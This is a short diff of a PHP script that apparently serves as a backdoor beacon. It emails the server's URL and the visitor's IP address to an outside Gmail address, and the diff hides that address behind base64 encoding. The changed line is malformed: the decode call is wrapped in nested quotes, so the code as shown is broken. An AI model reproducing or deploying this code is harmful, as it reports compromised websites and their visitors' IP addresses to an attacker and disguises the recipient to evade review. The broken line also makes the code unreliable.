@@ -5,7 +5,7 @@
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$dm = 'akunepff200@gmail.com';
+$dm = 'base64_decode('YWt1bmVwZmYyMDBAZ21haWwuY29t')';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $ma = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($dm, "MD", $ma, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
